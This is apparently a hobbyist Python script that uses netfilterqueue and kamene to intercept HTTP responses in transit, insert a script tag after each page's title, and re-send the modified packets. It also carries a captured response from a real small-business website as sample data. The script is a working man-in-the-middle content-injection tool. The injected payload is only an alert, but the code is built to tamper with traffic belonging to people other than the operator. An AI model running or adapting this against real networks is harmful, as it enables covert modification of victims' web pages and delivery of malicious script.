import netfilterqueue

from kamene.packet import Packet
from kamene.layers.dns import IP, Raw, TCP
from kamene.all import sr, send

count = 0
known_acks = []
def usePacketReq(pkt : netfilterqueue.Packet):
    global count
    keep = True
    packet : Packet = IP(pkt.get_payload())
    if(packet.haslayer(Raw) and packet.haslayer(TCP)):
        if(b'GET /' in packet[Raw].load and b'text/html' in packet[Raw].load):
            count = count + 1
            print('\n\n\n\n')
            print('###############%s###################' % str(count))
            print(packet[Raw].load)
    
    pkt.accept()

def usePacketResp(pkt : netfilterqueue.Packet):
    global count
    htmlInject = b'<script>alert("123")</script>'
    searchFor = b'Content-Type: text/html'
    keep = True
    packet : Packet = IP(pkt.get_payload())
    if(packet.haslayer(Raw) and packet.haslayer(TCP)):
        if(searchFor in packet[Raw].load):
            if(b'Content-Encoding: gzip' in packet[Raw].load):
                print('need to work on gzip decoding')
            else:
                count = count + 1
                headers, body = packet[Raw].load.split(b"\r\n\r\n", 1)
                headers = headers.split(b"\r\n")
                print('\n\n\n\n')
                print('###############%s###################' % str(count))
                #print(headers)
                #print(body)
                if(b'<!DOCTYPE html' in body and packet[TCP].ack not in known_acks):
                    known_acks.append(packet[TCP].ack)
                    print('\nack - %s' %str(packet[TCP].ack))
                    psplit = body.split(b'</title>', 1)
                    body = psplit[0] + htmlInject + b'</title>' + psplit[1]
                    headers = b"\r\n".join(headers)
                    packet[Raw].load = headers + b"\r\n\r\n" + body
                    print(packet[Raw].load)
                    packet[IP].len = len(str(pkt))
                    del packet[IP].chksum
                    del packet[TCP].chksum
                    pkt.set_payload(bytes(packet))
    pkt.accept()
    
def main():
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(1, usePacketResp)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('')
    nfqueue.unbind()

if __name__ == "__main__":
    main()
    #print((b'HTTP/1.1 200 OK\r\nDate: Wed, 10 Oct 2018 17:01:53 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.31\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nLink: <http://s-flowers.co.il/wp-json/>; rel="https://api.w.org/", <http://s-flowers.co.il/>; rel=shortlink\r\nX-Powered-By: PleskLin\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nc330\r\n<!DOCTYPE html>\n\n<!--[if lt IE 7 ]><html class="ie ie6" dir="rtl" lang="he-IL"> <![endif]-->\n\n<!--[if IE 7 ]><html class="ie ie7" dir="rtl" lang="he-IL"> <![endif]-->\n\n<!--[if IE 8 ]><html class="ieie8" dir="rtl" lang="he-IL"> <![endif]-->\n\n<!--[if IE 9 ]><html class="ie ie9" dir="rtl" lang="he-IL"> <![endif]-->\n\n<!--[if (gt IE 9)|!(IE)]><!--><html dir="rtl" lang="he-IL"> <!--<![endif]-->\n\n<head>\n\n\t<title>\xd7\xa1\xd7\x91\xd7\x99\xd7\x95\xd7\xa0\xd7\x99 \xd7\x94\xd7\xa9\xd7\xa8\xd7\x95\xd7\x9f -\xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\x91\xd7\xa7\xd7\xa0\xd7\x99\xd7\x95\xd7\x9f \xd7\xa1\xd7\x91\xd7\x99\xd7\x95\xd7\xa0\xd7\x99\xd7\x9d | \xd7\xa1\xd7\x91\xd7\x99\xd7\x95\xd7\xa0\xd7\x99 \xd7\x94\xd7\xa9\xd7\xa8\xd7\x95\xd7\x9f \xd7\x97\xd7\xa0\xd7\x95\xd7\xaa \xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\x94\xd7\x9e\xd7\x9e\xd7\x95\xd7\xa7\xd7\x9e\xd7\xaa \xd7\x91\xd7\xa7\xd7\xa0\xd7\x99\xd7\x95\xd7\x9f \xd7\xa1\xd7\x91\xd7\x99\xd7\x95\xd7\xa0\xd7\x99\xd7\x9d \xd7\x94\xd7\x9e\xd7\xa6\xd7\x99\xd7\xa2\xd7\x94 \xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\x98\xd7\xa8\xd7\x99\xd7\x99\xd7\x9d \xd7\x95\xd7\x90\xd7\x9b\xd7\x95\xd7\xaa\xd7\x99\xd7\x99\xd7\x9d , \xd7\x9e\xd7\xa9\xd7\x9c\xd7\x95\xd7\x97\xd7\x99\xd7\x9d \xd7\x91\xd7\x9b\xd7\x95\xd7\x9c \xd7\x92\xd7\x95\xd7\xa9 \xd7\x93\xd7\x9f . \xd7\x94\xd7\x90\xd7\x94\xd7\x91\xd7\x94 \xd7\x9c\xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\x96\xd7\x95 \xd7\x92\xd7\xa8\xd7\x9e\xd7\x94 \xd7\x9c\xd7\xa0\xd7\x95 \xd7\x9c\xd7\x94\xd7\xa7\xd7\x99\xd7\x9d \xd7\x90\xd7\xaa \xd7\xa1\xd7\x91\xd7\x99\xd7\x95\xd7\xa0\xd7\x99 \xd7\x94\xd7\xa9\xd7\xa8\xd7\x95\xd7\x9f \xd7\x94\xd7\x97\xd7\xa0\xd7\x95\xd7\xaa \xd7\x9e\xd7\xa6\xd7\x99\xd7\xa2\xd7\x94 \xd7\x9e\xd7\x91\xd7\x97\xd7\xa8 \xd7\xa2\xd7\xa9\xd7\x99\xd7\xa8 \xd7\xa9\xd7\x9c \xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d , \xd7\xa2\xd7\xa6\xd7\x99\xd7\xa6\xd7\x99\xd7\x9d , \xd7\x91\xd7\x9c\xd7\x95\xd7\xa0\xd7\x99\xd7\x9d \xd7\x95\xd7\xa2\xd7\x95\xd7\x93 &#8230; \xd7\x9e\xd7\xa9\xd7\x9c\xd7\x95\xd7\x97\xd7\x99 \xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\x91\xd7\x99\xd7\x94\xd7\x95\xd7\x93 , \xd7\x9e\xd7\xa9\xd7\x9c\xd7\x95\xd7\x97\xd7\x99\xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\xa7\xd7\xa8\xd7\x99\xd7\x99\xd7\xaa \xd7\x90\xd7\x95\xd7\xa0\xd7\x95 \xd7\x9e\xd7\xa9\xd7\x9c\xd7\x95\xd7\x97\xd7\x99 \xd7\xa4\xd7\xa8\xd7\x97\xd7\x99\xd7\x9d \xd7\xaa\xd7\x9c \xd7').decode('UTF-8'))